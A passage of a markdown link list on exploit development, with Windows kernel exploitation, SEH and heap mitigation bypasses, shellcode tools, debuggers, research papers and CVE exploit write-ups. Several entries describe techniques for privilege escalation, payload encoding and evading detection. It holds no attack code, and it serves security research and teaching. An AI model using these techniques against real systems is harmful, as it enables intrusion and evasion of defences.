-	* With the rise of sandboxes and locked down user accounts attackers are increasingly resorting to attacking kernel mode code to gain full access to compromised systems. The talk provided an overview of the Windows kernel mode attack surface and how to interact with it. It then went on to cover the tools available for finding bugs in Windows kernel mode code and drivers as well as highlighting some of the lower hanging fruit, common mistakes and the steps being taken (or lack of steps being taken) to mitigate the risks posed. The talk also covered common exploitation techniques to gather information about the state of kernel mode memory and to gain code execution as SYSTEM. Finally the talk walked through exploiting CVE-2016-7255 on modern 64 bit versions of Windows.
-* [Securi-Tay 2017 - A Window into Ring0](https://www.youtube.com/watch?v=DLND8bKv27w)
-	* With the rise of sandboxes and locked down user accounts attackers are increasingly resorting to attacking kernel mode code to gain full access to compromised systems. This talk aims to provide an overview of the Windows kernel mode attack surface and how to interact with it. This talk will demonstrate the tools available for finding bugs in Windows kernel mode code and drivers together with highlighting some of the lower hanging fruit, common mistakes and the steps being taken (or lack of steps being taken) to mitigate the risks posed. The talk will then cover common exploitation techniques to gather information about the state of kernel mode memory and to gain code execution as SYSTEM using examples from publicly known exploits.
-* [I Know Where Your Page Lives: Derandomizing the latest Windows 10 Kernel - ZeroNights 2016](https://github.com/IOActive/I-know-where-your-page-lives)
-* [HackSys Extreme Vulnerable Driver](http://www.payatu.com/hacksys-extreme-vulnerable-driver/)
-	* HackSys Extreme Vulnerable Driver is intentionally vulnerable Windows driver developed for security enthusiasts to learn and polish their exploitation skills at Kernel level.  
-	* HackSys Extreme Vulnerable Driver caters wide range of vulnerabilities ranging from simple Buffer Overflows to complex Use After Frees and Pool Overflows. This allows the researchers to explore the exploitation techniques for all the implemented vulnerabilities.z6z
-* [Windows-driver-samples](https://github.com/Microsoft/Windows-driver-samples	)
-* This repo contains driver samples prepared for use with Microsoft Visual Studio and the Windows Driver Kit (WDK). It contains both Universal Windows Driver and desktop-only driver samples.
-* [DriverBuddy](https://github.com/nccgroup/DriverBuddy)
-* DriverBuddy is an IDA Python script to assist with the reverse engineering of Windows kernel drivers.
-	* [Blog post](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2016/november/driverbuddy-tool-release/)
-* [win_driver_plugin](https://github.com/mwrlabs/win_driver_plugin)
-* A tool to help when dealing with Windows IOCTL codes or reversing Windows drivers.
-* [Write your first driver - docs ms](https://docs.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/writing-your-first-driver)
-* [Advanced Windows Debugging: Memory Corruption Part II—Heaps](http://www.informit.com/articles/article.aspx?p=1081496)
-	* Daniel Pravat and Mario Hewardt discuss security vulnerabilities and stability issues that can surface in an application when the heap is used in a nonconventional fashion.
-* [Sharks in the Pool :: Mixed Object Exploitation in the Windows Kernel PoolSharks in the Pool :: Mixed Object Exploitation in the Windows Kernel Pool](http://srcincite.io/blog/2017/09/06/sharks-in-the-pool-mixed-object-exploitation-in-the-windows-kernel-pool.html)
-* [Analysing the NULL SecurityDescriptor kernel exploitation mitigation in the latest Windows 10 v1607 Build 14393](https://labs.nettitude.com/blog/analysing-the-null-securitydescriptor-kernel-exploitation-mitigation-in-the-latest-windows-10-v1607-build-14393/)
-
-
-
-
-
-
-
-
---------------------
-#### <a name="SEH"></a>SEH/SE-HOP Defeat/Bypass
-* [Bypassing SEHOP](https://repo.zenk-security.com/Reversing%20.%20cracking/Bypassing%20SEHOP.pdf)
-* [Great Writeup/Example of SEH Bypass](http://www.primalsecurity.net/0x3-exploit-tutorial-buffer-overflow-seh-bypass/)
-* [SEH Overwrites Simplified v1.01](http://repo.palkeo.com/hacking/bas%20niveau/SEH%20overwrite.pdf)
-* [(SEH Bypass)Defeating the Stack Based Buffer Overflow Prevention Mechanism of Microsoft Windows 2003 Server.](https://www.blackhat.com/presentations/bh-asia-03/bh-asia-03-litchfield.pdf)
-* [A Crash Course on the Depths of Win32? Structured Exception Handling](https://www.microsoft.com/msj/0197/exception/exception.aspx)
-* [Intro to Windows kernel exploitation 1/N: Kernel Debugging](https://www.whitehatters.academy/intro-to-kernel-exploitation-part-1/)
-* [Win32 Assembly Components - Last Stage of Delirium Research Group](http://www.bandwidthco.com/whitepapers/programming/asm/Win32%20Assembly%20Components.pdf)
-* [Preventing the Exploitation of Structured Exception Handler (SEH) Overwrites with SEHOP](https://blogs.technet.microsoft.com/srd/2009/02/02/preventing-the-exploitation-of-structured-exception-handler-seh-overwrites-with-sehop/)
-* [Structured Exception Handling - TechNet](https://msdn.microsoft.com/en-us/library/windows/desktop/ms680657%28v=vs.85%29.aspx)
-* [Defeating Microsoft Windows XP SP2 Heap protection and DEP bypass ](https://www.ptsecurity.com/upload/corporate/ww-en/download/defeating-xpsp2-heap-protection.pdf)
-
-
-
---------------------
-#### <a name="winheap"></a>Windows Heap Exploitation
-* [Reliable Windows Heap Exploits](http://xcon.xfocus.org/XCon2004/archives/14_Reliable%20Windows%20Heap%20Exploits_BY_SHOK.pdf)
-* [Windows 10 HAL’s Heap – Extinction of the "HalpInterruptController" Table Exploitation Technique  Another kernel exploitation technique killed in Windows 10 Creators Update](https://labs.bluefrostsecurity.de/blog/2017/05/11/windows-10-hals-heap-extinction-of-the-halpinterruptcontroller-table-exploitation-technique/)
-* [WinHeap-Explorer](https://github.com/WinHeapExplorer/WinHeap-Explorer)
-	* The efficient and transparent proof-of-concept tool for heap-based bugs detection in x86 machine code for Windows applications.
-
-
-
-
-
-
-
-### <a name="antifuzz">Anti-Fuzzing</a>
-* [Intro to Anti-Fuzzing](https://www.nccgroup.com/en/blog/2014/01/introduction-to-anti-fuzzing-a-defence-in-depth-aid/()
-
-
-
-
-
-
-
-
---------------------
-### <a name="asm">Assembly(x86/x64/ARM)</a>
-* [X86 Instruction Reference](http://www.Felixcoutier.com/x86)
-* [Awesome Reference for Intel x86/64](http://ref.x86asm.net/)
-	* This reference is intended to be precise opcode and instruction set reference (including x86-64). Its principal aim is exact definition of instruction parameters and attributes.
-* [Nasm x86 reference](https://www.cs.uaf.edu/2006/fall/cs301/support/x86/)
-* [Intel Pentium Instruction Set Reference (A)](http://faydoc.tripod.com/cpu/index_a.htm)
-* [Iczelion's Win32 Assembly Homepage](http://www.programminghorizon.com/win32assembly/)
-* [cgasm](https://github.com/bnagy/cgasm)
-	* cgasm is a standalone, offline terminal-based tool with no dependencies that gives me x86 assembly documentation. It is pronounced "SeekAzzem".
-
-
-
-
---------------------
-### <a name="antidebug">Anti-Debugging</a>
-* [The Ultimate Anti-Debugging Reference(2011)](http://pferrie.host22.com/papers/antidebug.pdf)
-	* Good reference, though old.
-* [Windows Anti-Debug Reference](http://www.symantec.com/connect/articles/windows-anti-debug-reference)
-	* Good, but also old, Nov2010
-* [gargoyle, a memory scanning evasion technique](https://jlospinoso.github.io/security/assembly/c/cpp/developing/software/2017/03/04/gargoyle-memory-analysis-evasion.html)
-
-
-
-
-
-
-
-
-### <a name="generaltools">General Tools</a>
-
-Check out the 'Reverse Engineering" Section's Tools list for a lot of useful tools that aren't listed here.
-
-#### General Tools
-* [binwally](https://github.com/bmaia/binwally)
-	* Binary and Directory tree comparison tool using the Fuzzy Hashing concept (ssdeep)
-	* [Using Binwally](http://w00tsec.blogspot.com/2013/12/binwally-directory-tree-diff-tool-using.html)
-* [Equip: python bytecode instrumentation](https://github.com/neuroo/equip)
-	* equip is a small library that helps with Python bytecode instrumentation. Its API is designed to be small and flexible to enable a wide range of possible instrumentations. The instrumentation is designed around the injection of bytecode inside the bytecode of the program to be instrumented. However, the developer does not need to know anything about the Python bytecode since the injected code is Python source.
-* [lisa.py](https://github.com/ant4g0nist/lisa.py)
-	* An Exploit Dev Swiss Army Knife.
-* [SCANSPLOIT](https://github.com/huntergregal/scansploit)
-	* Exploit using barcodes, QRcodes, earn13, datamatrix
-* [sandbox-attacksurface-analysis-tools](https://github.com/google/sandbox-attacksurface-analysis-tools)
-	* This is a small suite of tools to test various properties of sandboxes on Windows. Many of the checking tools take a -p flag which is used to specify the PID of a sandboxed process. The tool will impersonate the token of that process and determine what access is allowed from that location. Also it's recommended to run these tools as an administrator or local system to ensure the system can be appropriately enumerated.
-* [DotNetToJScript](https://github.com/tyranid/DotNetToJScript)
-	* A tool to create a JScript file which loads a .NET v2 assembly from memory.
-
-
-#### Hunting/Making Exploits Tools(DeBrujinn sequence)
-* [Pattern-Create/offset as a python function](https://github.com/jbertman/pattern_create)
-	* Metasploit pattern generator in Python, modified to be used as a function 
-* [!exploitable Crash Analyzer](https://msecdbg.codeplex.com/)
-	* !exploitable (pronounced bang exploitable) is a Windows debugging extension (Windbg) that provides automated crash analysis and security risk assessment. The tool first creates hashes to determine the uniqueness of a crash and then assigns an exploitability rating to the crash: Exploitable, Probably Exploitable, Probably Not Exploitable, or Unknown. There is more detailed information about the tool in the following .pptx file or at http://www.microsoft.com/security/msec. Additonally, see the [blog post](http://blogs.technet.com/srd/archive/2009/04/08/the-history-of-the-exploitable-crash-analyzer.aspx), or [watch the video](http://channel9.msdn.com/posts/PDCNews/Bang-Exploitable-Security-Analyzer/).
-* [Findjmp2](http://www.securiteam.com/tools/5LP0C1PEUY.html)
-	* Findjmp2 is a modified version of Findjmp from eEye.com to find jmp, call, push in a loaded DLL. This version includes search for pop/pop/ret set of instructions that is useful to bypass Windows XP SP2 and Windows 2003 stack protection mechanism.
-* [binjitsu](https://github.com/binjitsu/binjitsu/)
-	* binjitsu is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.
-
-
-
-
-#### Shellcode Tools
-* [meterssh](https://github.com/trustedsec/meterssh)
-	* MeterSSH is a way to take shellcode, inject it into memory then tunnel whatever port you want to over SSH to mask any type of communications as a normal SSH connection. 
-* [rp++](https://github.com/0vercl0k/rp)
-	* rp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O (doesn't support the FAT binaries) x86/x64 binaries. It is open-source, documented with Doxygen (well, I'm trying to..) and has been tested on several OS: Debian / Windows 7 / FreeBSD / Mac OSX Lion (10.7.3). Moreover, it is x64 compatible. I almost forgot, it handles both Intel and AT&T syntax (beloved BeaEngine). By the way, the tool is a standalone executable ; I will upload static-compiled binaries for each OS.
-* [Shellcode_Tools](https://github.com/MarioVilas/shellcode_tools)
-	* Miscellaneous tools written in Python, mostly centered around shellcodes.
-	* bin2py: Embed binary files into Python source code.
-	* shellcode2exe: Convert shellcodes into executable files for multiple platforms.
-* [rp++](https://github.com/0vercl0k/rp)
-	* rp++ is a full-cpp written tool that aims to find ROP sequences in PE/Elf/Mach-O x86/x64/ARM binaries. It is open-source and has been tested on several OS: Debian / Windows 8.1 / Mac OSX Lion (10.7.3). Moreover, it is x64 compatible and supports Intel syntax. Standalone executables can also be directly downloaded. 
-
-
-
-
-
-
-
-
------------------------
-### <a name="decomp">Decompilers & Disassemblers</a>
-* [Bokken](https://inguma.eu/projects/bokken)
-* Bokken is a GUI for the Pyew and Radare projects so it offers almost all the same features that Pyew has and and some of the Radare's ones. It's intended to be a basic disassembler, mainly, to analyze malware and vulnerabilities.  Currently Bokken is neither an hexadecimal editor nor a full featured disassembler YET, so it should not be used for deep code analysis or to try to modify files with it.
-* [IDA](https://www.hex-rays.com/products/ida/)
-	* IDA Pro combines an interactive, programmable, multi-processor disassembler coupled to a local and remote debugger and augmented by a complete plugin programming environment.
-	* [Overview & Tutorials](https://www.hex-rays.com/products/ida/debugger/index.shtml)
-	* Ida Plugins
-		* [Ida Sploiter](https://thesprawl.org/projects/ida-sploiter/)
-			* IDA Sploiter is a plugin for Hex-Ray's IDA Pro disassembler designed to enhance IDA's capabilities as an exploit development and vulnerability research tool. Some of the plugin's features include a powerful ROP gadgets search engine, semantic gadget analysis and filtering, interactive ROP chain builder, stack pivot analysis, writable function pointer search, cyclic memory pattern generation and offset analysis, detection of bad characters and memory holes, and many others.
-		* [Ida Pomidor](https://thesprawl.org/projects/ida-pomidor/)
-			* IDA Pomidor is a fun and simple plugin for the Hex-Ray's IDA Pro disassembler that will help you retain concentration and productivity during long reversing sessions. 
-		* [FLARE-Ida](https://github.com/fireeye/flare-ida)
-			* This repository contains a collection of IDA Pro scripts and plugins used by the FireEye Labs Advanced Reverse Engineering (FLARE) team.
-* [Hopper](http://www.hopperapp.com/)
-	* Hopper is a reverse engineering tool for OS X and Linux, that lets you disassemble, decompile and debug your 32/64bits Intel Mac, Linux, Windows and iOS executables!
-* [Reverse](https://github.com/joelpx/reverse)
-	* Reverse engineering for x86 binaries (elf-format). Generate a more readable code (pseudo-C) with colored syntax. Warning, the project is still in development, use it at your own risks. This tool will try to disassemble one function (by default main). The address of the function, or its symbol, can be passed by argument.
-* [fREedom - capstone based disassembler for extracting to binnavi](https://github.com/cseagle/fREedom)
-	* fREedom is a primitive attempt to provide an IDA Pro independent means of extracting disassembly information from executables for use with binnavi (https://github.com/google/binnavi).
-	* [Setting up fREedom and BinNavi](https://summitroute.com/blog/2015/12/31/setting_up_freedom_and_binnavi/)
-* [BinNavi](https://github.com/google/binnavi)
-	* BinNavi is a binary analysis IDE that allows to inspect, navigate, edit and annotate control flow graphs and call graphs of disassembled code.
-
-
-
-
-
-
-----------------
-### <a name="debug">Debuggers</a>
-#### General/Platform Neutral
-* [The Secret Lives of Debuggers - Lance Buttars - BSides SLC15](https://www.youtube.com/watch?v=V8trrmIsdb0)
-	* Binaries are files like any text file or a bitmap. They can be modified and changed.With some basic understanding of assembly language anyone can take a binary and modify its execution in a debugger and using a hex editor change how it executes. In this presentation I will cover the basics of binary manipulation and the use of debuggers to change program execution.
-* [HyperDbg](https://github.com/rmusser01/hyperdbg/)
-	* HyperDbg is a kernel debugger that leverages hardware-assisted virtualization. More precisely, HyperDbg is based on a minimalistic hypervisor that is installed while the system runs. Compared to traditional kernel debuggers (e.g., WinDbg, SoftIce, Rasta R0 Debugger) HyperDbg is completely transparent to the kernel and can be used to debug kernel code without the need of serial (or USB) cables. For example, HyperDbg allows to single step the execution of the kernel, even when the kernel is executing exception and interrupt handlers. Compared to traditional virtual machine based debuggers (e.g., the VMware builtin debugger), HyperDbg does not require the kernel to be run as a guest of a virtual machine, although it is as powerful. 
-	* [Paper](http://roberto.greyhats.it/pubs/ase10.pdf)
-* [xnippet](https://github.com/isislab/xnippet)
-	* xnippet is a tool that lets you load code snippets or isolated functions (no matter the operating system they came from), pass parameters to it in several formats (signed decimal, string, unsigned hexadecimal...), hook other functions called by the snippet and analyze the result. The tool is written in a way that will let me improve it in a future, defining new calling conventions and output argument pointers.
-* [voltron](https://github.com/snare/voltron)
-	* Voltron is an extensible debugger UI toolkit written in Python. It aims to improve the user experience of various debuggers (LLDB, GDB, VDB and WinDbg) by enabling the attachment of utility views that can retrieve and display data from the debugger host. By running these views in other TTYs, you can build a customised debugger user interface to suit your needs.
-
-
-#### Linux
-* [GDB - GNU Debugger](https://www.gnu.org/software/gdb/)
-	* GDB, the GNU Project debugger, allows you to see what is going on `inside' another program while it executes -- or what another program was doing at the moment it crashed. 
-* [PEDA](https://github.com/longld/peda)
-	* PEDA - Python Exploit Development Assistance for GDB 
-* [radare2 as an alternative to gdb-peda](https://monosource.github.io/2016/10/radare2-peda)
-* [pwndbg - Making debugging suck less](https://github.com/zachriggle/pwndbg)
-	* A PEDA replacement. In the spirit of our good friend windbg, pwndbg is pronounced pwnd-bag.
-	* Uses capstone as backend.
-* [gdbgui](https://github.com/cs01/gdbgui)
-	* A modern, browser-based frontend to gdb (gnu debugger). Add breakpoints, view stack traces, and more in C, C++, Go, and Rust. Simply run gdbgui from the terminal and a new tab will open in your browser.
-* [GEF - GDB Enhanced Features](https://github.com/hugsy/gef)
-	* GEF is aimed to be used mostly by exploiters and reverse-engineers. It provides additional features to GDB using the Python API to assist during the process of dynamic analysis or exploit development.
-	* Why not PEDA?
-	* Yes!! Why not?! PEDA is a fantastic tool to do the same, but is only to be used for x86-32 or x86-64. On the other hand, GEF supports all the architecture supported by GDB (x86, ARM, MIPS, PowerPC, SPARC, and so on).
-	* [Docs](https://gef.readthedocs.org/en/latest/)
-
-
-
-#### Windows
-* [An Introduction to Debugging the Windows Kernel with WinDbg](http://www.contextis.com/resources/blog/introduction-debugging-windows-kernel-windbg/)
-* [Getting Started with WinDbg part 1](http://blog.opensecurityresearch.com/2013/12/getting-started-with-windbg-part-1.html)
-* [OllyDbg](http://www.ollydbg.de/)
-	* OllyDbg is a 32-bit assembler level analysing debugger for Microsoft® Windows®. Emphasis on binary code analysis makes it particularly useful in cases where source is unavailable.
-	* [OllyDbg Tricks for Exploit Development](http://resources.infosecinstitute.com/in-depth-seh-exploit-writing-tutorial-using-ollydbg/)
-* [WinDbg](https://msdn.microsoft.com/en-us/library/windows/hardware/ff551063%28v=vs.85%29.aspx)
-	*[Excellent Resource Site](http://www.windbg.org/)
-	*[Crash Dump Analysis Poster](http://www.dumpanalysis.org/CDAPoster.html)
-	* [Getting Started with WinDbg (User-Mode)](https://msdn.microsoft.com/en-us/library/windows/hardware/dn745911%28v=vs.85%29.aspx)
-	* [Getting Started with WinDbg (Kernel-Mode)](https://msdn.microsoft.com/en-us/library/windows/hardware/dn745912%28v=vs.85%29.aspx)
-* [TWindbg](https://github.com/bruce30262/TWindbg)
-	* PEDA-like debugger UI for WinDbg
-* [WinAppDbg](http://winappdbg.sourceforge.net/)
-	* The WinAppDbg python module allows developers to quickly code instrumentation scripts in Python under a Windows environment. It uses ctypes to wrap many Win32 API calls related to debugging, and provides a powerful abstraction layer to manipulate threads, libraries and processes, attach your script as a debugger, trace execution, hook API calls, handle events in your debugee and set breakpoints of different kinds (code, hardware and memory). Additionally it has no native code at all, making it easier to maintain or modify than other debuggers on Windows. The intended audience are QA engineers and software security auditors wishing to test or fuzz Windows applications with quickly coded Python scripts. Several ready to use tools are shipped and can be used for this purposes. Current features also include disassembling x86/x64 native code, debugging multiple processes simultaneously and produce a detailed log of application crashes, useful for fuzzing and automated testing.
-* [x64dbg](http://x64dbg.com/)
-	* [An introduction to x64dbg](http://reverseengineeringtips.blogspot.com/2015/01/an-introduction-to-x64dbg.html)
-
-
-
-----------------
-### <a name="papers">General Exploit Development Papers</a>
-* [Glibc Adventures: The Forgotten Chunks](http://www.contextis.com/documents/117/Glibc_Adventures-The_Forgotten_Chunks.pdf)
-	* Exploiting Glibc
-* [x86-64 buffer overflow exploits and the borrowed code chunks exploitation technique](http://users.suse.com/~krahmer/no-nx.pdf)
-	* The x86-64 CPU platform (i.e. AMD64 or Hammer) introduces new features to protect against exploitation of buffer overflows, the so called No Execute(NX) or Advanced Virus Protection (A VP). This non-executable enforcement of data pages and the ELF64 SystemV ABI render common buffer overflow exploitation techniques useless. This paper describes and analyzes the protection mechanisms in depth. Research and tar get platform was a SUSE Linux 9.3 x86-64 system but the results can be expanded to non-Linux systems as well. search engine tag: SET-krahmer-bccet-2005.
-* [ROPs are for the 99% - Yang Yu](https://cansecwest.com/slides/2014/ROPs_are_for_the_99_CanSecWest_2014.pdf)
-* [Temporal Return Addresses ](http://uninformed.org/?v=all&a=9&t=sumry)
-	* Nearly all existing exploitation vectors depend on some knowledge of a process' address space prior to an attack in order to gain meaningful control of execution flow. In cases where this is necessary, exploit authors generally make use of static addresses that may or may not be portable between various operating system and application revisions. This fact can make exploits unreliable depending on how well researched the static addresses were at the time that the exploit was implemented. In some cases, though, it may be possible to predict and make use of certain addresses in memory that do not have static contents. This document introduces the concept of temporal addresses and describes how they can be used, under certain circumstances, to make exploitation more reliable. 
-* [Modern Binary Attacks and Defences in the  Windows Environment ? Fighting Against Microsoft  EMET in Seven Rounds](https://drive.google.com/file/d/0B6nX_hw9OjVyVXU1OW9LbHlVRWs/view?pli=1)
-* [Reducing the Effective Entropy of GS Cookies](http://uninformed.org/?v=all&a=32&t=sumry)
-	* This paper describes a technique that can be used to reduce the effective entropy in a given GS cookie by roughly 15 bits. This reduction is made possible because GS uses a number of weak entropy sources that can, with varying degrees of accuracy, be calculated by an attacker. It is important to note, however, that the ability to calculate the values of these sources for an arbitrary cookie currently relies on an attacker having local access to the machine, such as through the local console or through terminal services. This effectively limits the use of this technique to stack-based local privilege escalation vulnerabilities. In addition to the general entropy reduction technique, this paper discusses the amount of effective entropy that exists in services that automatically start during system boot. It is hypothesized that these services may have more predictable states of entropy due to the relative consistency of the boot process. While the techniques described in this paper do not illustrate a complete break of GS, any inherent weakness can have disastrous consequences given that GS is a static, compile-time security solution. It is not possible to simply distribute a patch. Instead, applications must be recompiled to take advantage of any security improvements. In that vein, the paper proposes some solutions that could be applied to address the problems that are outlined.
-* [OS X Kernel-mode Exploitation in a Weekend](http://uninformed.org/?v=all&a=37&t=sumry)
-	* Apple's Mac OS X operating system is attracting more attention from users and security researchers alike. Despite this increased interest, there is still an apparent lack of detailed vulnerability development information for OS X. This paper will attempt to help bridge this gap by walking through the entire vulnerability development process. This process starts with vulnerability discovery and ultimately finished with a remote code execution. To help illustrate this process, a real vulnerability found in the OS X wireless device driver is used. 
-* [Getting out of Jail: Escaping Internet Explorer Protected Mode](http://uninformed.org/?v=all&a=39&t=sumry)
-	* With the introduction of Windows Vista, Microsoft has added a new form of mandatory access control to the core operating system. Internally known as "integrity levels", this new addition to the security manager allows security controls to be placed on a per-process basis. This is different from the traditional model of per-user security controls used in all prior versions of Windows NT. In this manner, integrity levels are essentially a bolt-on to the existing Windows NT security architecture. While the idea is theoretically sound, there does exist a great possibility for implementation errors with respect to how integrity levels work in practice. Integrity levels are the core of Internet Explorer Protected Mode, a new "low-rights" mode where Internet Explorer runs without permission to modify most files or registry keys. This places both Internet Explorer and integrity levels as a whole at the forefront of the computer security battle with respect to Windows Vista.
-* [Context-keyed Payload Encoding](http://uninformed.org/?v=all&a=42&t=sumry)
-	* A common goal of payload encoders is to evade a third-party detection mechanism which is actively observing attack traffic somewhere along the route from an attacker to their target, filtering on commonly used payload instructions. The use of a payload encoder may be easily detected and blocked as well as opening up the opportunity for the payload to be decoded for further analysis. Even so-called keyed encoders utilize easily observable, recoverable, or guessable key values in their encoding algorithm, thus making decoding on-the-fly trivial once the encoding algorithm is identified. It is feasible that an active observer may make use of the inherent functionality of the decoder stub to decode the payload of a suspected exploit in order to inspect the contents of that payload and make a control decision about the network traffic. This paper presents a new method of keying an encoder which is based entirely on contextual information that is predictable or known about the target by the attacker and constructible or recoverable by the decoder stub when executed at the target. An active observer of the attack traffic however should be unable to decode the payload due to lack of the contextual keying information.
-* [Automating Mimicry Attacks Using Static Binary Analysis](https://www.usenix.org/legacy/events/sec05/tech/full_papers/kruegel/kruegel_html/attack.html)
-	* Intrusion detection systems that monitor sequences of system calls have recently become more sophisticated in defining legitimate application behavior. In particular, additional information, such as the value of the program counter and the configuration of the program's call stack at each system call, has been used to achieve better characterization of program behavior. While there is common agreement that this additional information complicates the task for the attacker, it is less clear to which extent an intruder is constrained.  In this paper, we present a novel technique to evade the extended detection features of state-of-the-art intrusion detection systems and reduce the task of the intruder to a traditional mimicry attack. Given a legitimate sequence of system calls, our technique allows the attacker to execute each system call in the correct execution context by obtaining and relinquishing the control of the application's execution flow through manipulation of code pointers.  We have developed a static analysis tool for Intel x86 binaries that uses symbolic execution to automatically identify instructions that can be used to redirect control flow and to compute the necessary modifications to the environment of the process. We used our tool to successfully exploit three vulnerable programs and evade detection by existing state-of-the-art system call monitors. In addition, we analyzed three real-world applications to verify the general applicability of our techniques. 
-* [Anti-Virus Software Gone Wrong](http://uninformed.org/?v=all&a=21&t=sumry)
-	* Anti-virus software is becoming more and more prevalent on end-user computers today. Many major computer vendors (such as Dell) bundle anti-virus software and other personal security suites in the default configuration of newly-sold computer systems. As a result, it is becoming increasingly important that anti-virus software be well-designed, secure by default, and interoperable with third-party applications. Software that is installed and running by default constitutes a prime target for attack and, as such, it is especially important that said software be designed with security and interoperability in mind. In particular, this article provides examples of issues found in well-known anti-virus products. These issues range from not properly validating input from an untrusted source (especially within the context of a kernel driver) to failing to conform to API contracts when hooking or implementing an intermediary between applications and the underlying APIs upon which they rely. For popular software, or software that is installed by default, errors of this sort can become a serious problem to both system stability and security. Beyond that, it can impact the ability of independent software vendors to deploy functioning software on end-user systems. 
-* [Sigreturn Oriented Programming is a real Threat](https://subs.emis.de/LNI/Proceedings/Proceedings259/2077.pdf)
-	* Abstract: This paper shows that Sigreturn Oriented Programming (SROP), which consists of using calls to sigreturn to execute arbitrary code, is a pow erful method for the de velopment of exploits. This is demonstrated by developing two different kinds of SROP based exploits, one asterisk exploit which was already portrayed in the paper presenting SROP, and one novel exploit for a recently disclosed bug inthe DNS address resolution of the default GNUC library. Taking advantage of the fact, that these exploits have very few dependencies on the program being exploited, a library is implemented to automate wide parts of SROP exploit creation. This highlights the potential of SROP in respect to reusable and portable exploit code which strongly supports the conclusion of the original paper: SROP is areal threat!
-* [Breaking the links: Exploiting the linker](https://www.nth-dimension.org.uk/pub/BTL.pdf)
-* [nt!_SEP_TOKEN_PRIVILEGES - Single Write EoP Protect - Kyriakos 'kyREcon' Economou](http://anti-reversing.com/Downloads/Sec_Research/ntoskrnl_v10.0.15063_nt!_SEP_TOKEN_PRIVILEGES-Single_Write_EoP_Protect.pdf)
-	* TL;DR: Abusing enabled token privileges through a kernel exploit to gain EoP it won't be enough anymore as from NT kernel version 10.0.15063 are 'checked' against the privileges present in the token of the calling process. So you will need two writes
-
-
-
-----------------
-### <a name="writeups">Miscellaneous Exploit Writeups</a>
-* [REMath](https://github.com/REMath/literature_review)
-* [Exploiting the DRAM rowhammer bug to gain kernel privileges](http://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html)
-	* "Rowhammer is a problem with some recent DRAM devices in which repeatedly accessing a row of memory can cause bit flips in adjacent rows. We tested a selection of laptops and found that a subset of them exhibited the problem. We built two working privilege escalation exploits that use this effect. One exploit uses rowhammer-induced bit flips to gain kernel privileges on x86-64 Linux when run as an unprivileged userland process. When run on a machine vulnerable to the rowhammer problem, the process was able to induce bit flips in page table entries (PTEs). It was able to use this to gain write access to its own page table, and hence gain read-write access to all of physical memory.
-	* [Program for testing for the DRAM "rowhammer" problem](https://github.com/google/rowhammer-test)
-* [ADI vs ROP](https://lazytyped.blogspot.it/2017/09/adi-vs-rop.html)
-* [shadow :: De Mysteriis Dom jemalloc](https://github.com/CENSUS/shadow)
-	* shadow is a jemalloc heap exploitation framework. It has been designed to be agnostic of the target application that uses jemalloc as its heap allocator (be it Android's libc, Firefox, FreeBSD's libc, standalone jemalloc, or whatever else). The current version (2.0) has been tested extensively with the following targets: Android 6 and 7 libc (ARM32 and ARM64); Firefox (x86 and x86-64) on Windows and Linux;
-* [Overview of Android's jemalloc structures using shadow](https://github.com/CENSUS/shadow/blob/master/docs/android_heap.md)
-	* In this document we explore Android's jemalloc structures using shadow. A simplified view of the heap is presented here. The intention of this document is to get you started with jemalloc structures and shadow's commands.
-
-
-
-
-
-
-
-
-
-
-
----------------
-#### <a name="talks"></a>Talks
-* [Advanced PDF Tricks - Ange Albertini, Kurt Pfeifle - [TROOPERS15]](https://www.youtube.com/watch?v=k9g9jZdjRcE)
-* [Extreme Privelege Escalataion on Windows8 UEFI Systems](https://www.youtube.com/watch?v=UJp_rMwdyyI)
-	* [Slides](https://www.blackhat.com/docs/us-14/materials/us-14-Kallenberg-Extreme-Privilege-Escalation-On-Windows8-UEFI-Systems.pdf)
-	* Summary by stormehh from reddit: In this whitepaper (and accompanying Defcon/Blackhat presentations), the authors demonstrate vulnerabilities in the UEFI "Runtime Service" interface accessible by a privileged userland process on Windows 8. This paper steps through the exploitation process in great detail and demonstrates the ability to obtain code execution in SMM and maintain persistence by means of overwriting SPI flash
-
-
-
-#### Writeups that are blogposts/Similar
-* [It All Swings Around - Malicious Macros](http://sketchymoose.blogspot.com/2015/02/it-all-swings-round-malicious-macros.html)
-	* Writeup and explanation of random Macro exploits
-* [Adventures in Xen Exploitation](https://www.nccgroup.com/en/blog/2015/02/adventures-in-xen-exploitation/)
-	* "This post is about my experience trying to exploit the Xen SYSRET bug (CVE-2012-0217)."
-* [Exploiting MS14-066](http://www.securitysift.com/exploiting-ms14-066-cve-2014-6321-aka-winshock/)
-* [Shellshock bug writeup by lcamtuf](http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html)
-* [Linux Kernel < 2.6.36.2 Econet Privilege Escalation Exploit](http://eshunrd.blogspot.com/2011/09/linux-kernel-26362-econet-privilege.html)
-* [Coding Malware for Fun and Not for Profit (Because that would be illegal)](http://www.malwaretech.com/2014/04/coding-malware-for-fun-and-not-for.html)
-* [Exploiting BadIRET vulnerability - CVE-2014-9322, Linux kernel privilege escalation](http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/)
-* [Exploiting CVE-2015-0311: A Use-After-Free in Adobe Flash Player](http://blog.coresecurity.com/2015/03/04/exploiting-cve-2015-0311-a-use-after-free-in-adobe-flash-player/)
-	* "The vulnerability was first discovered as a zero-day being actively exploited in the wild as part of the Angler Exploit Kit. Although the exploit code was highly obfuscated using the SecureSWF obfuscation tool, malware samples taking advantage of this vulnerability became publicly available, so I decided to dig into the underlying vulnerability in order to exploit it and write the corresponding module for Core Impact Pro and Core Insight."
-* [A Technical Analysis of CVE 2014-1776](http://blog.fortinet.com/post/a-technical-analysis-of-cve-2014-1776)
-* [Diving into A Silverlight Exploit and Shellcode - Analysis and Techniques](http://www.checkpoint.com/downloads/partners/TCC-Silverlight-Jan2015.pdf)
-* Abstract: We will observe how the exploit is obfuscated; how it loads parts of the code dynamically into the memory in order to reduce the chances of being detected by signature based protections and how to extract these components from the exploit. In addition we will look at the shell-code supplied by the exploit-kit and how it uses encryption to hide the payload's URL and contents.
-* [Owning Internet Printing - A Case Study in Modern Software Exploitation](https://googleprojectzero.blogspot.com/2015/06/owning-internet-printing-case-study-in.html?m=1)
